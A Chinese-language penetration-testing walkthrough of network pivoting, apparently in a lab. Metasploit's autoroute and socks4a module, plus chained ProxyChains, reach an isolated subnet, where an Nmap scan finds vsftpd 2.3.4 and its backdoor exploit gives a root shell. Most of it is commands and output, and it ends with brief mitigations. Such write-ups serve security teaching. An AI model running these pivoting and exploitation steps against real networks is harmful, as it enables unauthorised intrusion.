### 网络接口信息

- **名称**: MS TCP Loopback interface
  - **硬件MAC地址**: 00:00:00:00:00:00
  - **MTU**: 1520
  - **IPv4地址**: 127.0.0.1
  - **接口编号**: 65539

- **名称**: Intel(R) PRO/1000 MT Desktop Adapter
  - **硬件MAC地址**: 08:00:27:29:cd:cb
  - **MTU**: 1500
  - **IPv4地址**: 8.8.8.3
  - **IPv4子网掩码**: 255.255.255.0
  - **接口编号**: 65540

- **名称**: Intel(R) PRO/1000 MT Desktop Adapter #2
  - **硬件MAC地址**: 08:00:27:e3:47:43
  - **MTU**: 1500
  - **IPv4地址**: 7.7.7.20
  - **IPv4子网掩码**: 255.255.255.0

### ARP扫描与信息搜集

在第二个内网中，我们使用`arp_scanner`模块进行信息搜集。

```bash
meterpreter > run post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24
[*] Running module against SRV03
[*] ARP Scanning 8.8.8.0/24
[*]   IP: 8.8.8.3 MAC 08:00:27:29:cd:cb (CADMUS COMPUTER SYSTEMS)
[*]   IP: 8.8.8.1 MAC 0a:00:27:00:00:03 (UNKNOWN)
[*]   IP: 8.8.8.9 MAC 08:00:27:56:f1:7c (CADMUS COMPUTER SYSTEMS)
[*]   IP: 8.8.8.13 MAC 08:00:27:13:a3:b1 (CADMUS COMPUTER SYSTEMS)
```

ARP扫描结果显示该网段存在4台机器。接下来，我们添加路由规则以访问这些设备。

```bash
meterpreter > run autoroute -s 8.8.8.0/24
[*] Adding a route to 8.8.8.0/255.255.255.0...
[+] Added route to 8.8.8.0/255.255.255.0 via 7.7.7.20
[*] Use the -p option to list all active routes
msf > route print
Active Routing Table
====================
Subnet    Netmask        Gateway
7.7.7.0   255.255.255.0  Session 1
8.8.8.0   255.255.255.0  Session 3
```

### 双重跳板

通过第一台跳板机，我们在172.16.0.0/24和7.7.7.0/24网段之间建立了路由规则。现在，来自172.16.0.20的数据包可以通过RD主机转发到JC主机。为了访问新发现的8.8.8.0/24网段，我们需要定义新的路由规则，并使用外部工具运行一个新的SOCKS4服务来连接两个跳板并创建一个新的ProxyChains配置项。

- **RD**: 我不知道如何到达IP地址8.8.8.9，但我知道JC知道如何到达。我会把流量导向它。
- **JC**: 我知道如何将来自7.7.7.0/24网段的包转发到8.8.8.0/24网段。

最终攻击者控制和发现的系统如下图所示：

### 强大的ProxyChains

ProxyChains工具可以连接代理服务器并完成连接转换。目前，一个新的SOCKS4代理服务正在本地1081端口监听并转发至8.8.8.0/24网段。

```bash
msf exploit(ms08_067_netapi) > use auxiliary/server/socks4a 
msf auxiliary(socks4a) > show options 
Module options (auxiliary/server/socks4a):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  172.16.0.20      yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.
Auxiliary action:
   Name   Description
   ----   -----------
   Proxy  
msf auxiliary(socks4a) > set SRVPORT 1081
SRVPORT => 1081
msf auxiliary(socks4a) > run
[*] Auxiliary module execution completed
[*] Starting the socks4a proxy server
msf auxiliary(socks4a) >
```

新的代理服务将在`/etc/proxychains.conf`配置文件中添加。通过激活“**Dynamic Chain**”设置，多个代理之间的按序转接可以实现。

```bash
root@kali:~# cat /etc/proxychains.conf | grep -v "#"
dynamic_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000
socks4  172.16.0.20 1080  # First Pivot
socks4  172.16.0.20 1081  # Second Pivot
```

通过ProxyChains工具，目标8.8.8.9可以通过第二个跳板途径进行Nmap扫描。

```bash
root@kali:~# proxychains nmap -sT -sV -p21,22,23,80 8.8.8.9 -n -Pn -vv
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.25BETA1 ( https://nmap.org )
NSE: Loaded 36 scripts for scanning.
Initiating Connect Scan
Scanning 8.8.8.9 [4 ports]
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:21-<><>-OK
Discovered open port 21/tcp on 8.8.8.9
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:23-<><>-OK
Discovered open port 23/tcp on 8.8.8.9
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:22-<><>-OK
Discovered open port 22/tcp on 8.8.8.9
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:80-<><>-OK
Discovered open port 80/tcp on 8.8.8.9
Completed Connect Scan at 05:54, 1.37s elapsed (4 total ports)
Initiating Service scan at 05:54
Scanning 4 services on 8.8.8.9
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:21-<><>-OK
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:22-<><>-OK
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:23-<><>-OK
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:80-<><>-OK
Completed Service scan at 05:54, 11.09s elapsed (4 services on 1 host)
NSE: Script scanning 8.8.8.9.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:54
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:80-<><>-OK
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:80-<><>-OK
Completed NSE at 05:54, 1.71s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
Nmap scan report for 8.8.8.9
Host is up, received user-set (0.41s latency).
Scanned 
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.3.4
22/tcp open  ssh     syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp open  telnet  syn-ack Linux telnetd
80/tcp open  http    syn-ack Apache httpd 2.2.8 ((Ubuntu) DAV/2)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
root@kali:~#
```

从扫描结果可以看出，数据包首先通过第一个代理服务，随后经过第二个代理服务，最终到达目的地址。分析扫描结果发现，8.8.8.9主机上运行的vsftpd服务为一个存在漏洞的版本。

### 利用Metasploit中的vsftpd漏洞

以下步骤完成了Metasploit中vsftpd漏洞利用的配置，获取了最终目标的权限。

```bash
msf > use exploit/unix/ftp/vsftpd_234_backdoor 
msf exploit(vsftpd_234_backdoor) > show options 
Module options (exploit/unix/ftp/vsftpd_234_backdoor):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port
Exploit target:
   Id  Name
   --  ----
   0   Automatic
msf exploit(vsftpd_234_backdoor) > set rhost 8.8.8.9
rhost => 8.8.8.9
msf exploit(vsftpd_234_backdoor) > run
[*] 8.8.8.9:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 8.8.8.9:21 - USER: 331 Please specify the password.
[+] 8.8.8.9:21 - Backdoor service has been spawned, handling...
[+] 8.8.8.9:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 4 opened (Local Pipe -> Remote Pipe) 
pwd
/
id
uid=0(root) gid=0(root)
ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:56:f1:7c  
          inet addr:8.8.8.9  Bcast:8.8.8.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe56:f17c/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:10843 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2779 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1081842 (1.0 MB)  TX bytes:661455 (645.9 KB)
          Base address:0xd010 Memory:f0000000-f0020000 
lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:18161 errors:0 dropped:0 overruns:0 frame:0
          TX packets:18161 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:5307479 (5.0 MB)  TX bytes:5307479 (5.0 MB)
```

### 总结

攻击者通过以下步骤发现了两个不同的内网隔离网段：

1. 攻击者获取了相同网段中RD主机的权限。
2. 攻击者发现RD主机拥有两个网络连接。
3. 攻击者使用autoroute模块定义了一个路由规则。
4. 攻击者在7.7.7.0/24网段进行了ARP和NMAP扫描并发现了主机JC。
5. 主机JC存在“Easy File Share”和MS08-067两个不同漏洞。
6. 通过MS08-067的成功利用让攻击者获取了7.7.7.20的权限。
7. 通过对JC主机进行信息搜集发现同样拥有两个网络连接。
8. 在7.7.7.20上创建了一条新的路由规则。
9. 在8.8.8.0/24网段实施ARP和NMAP扫描。
10. IP地址为8.8.8.9的主机SK运行着存在漏洞的vsftpd。

### 缓解措施

- DMZ区域中包含多块网卡的系统应该被尽快移除。
- DMZ区域中的系统只能在DMZ区域中被访问。

### 参考资料

（此处可添加参考资料链接或详细说明）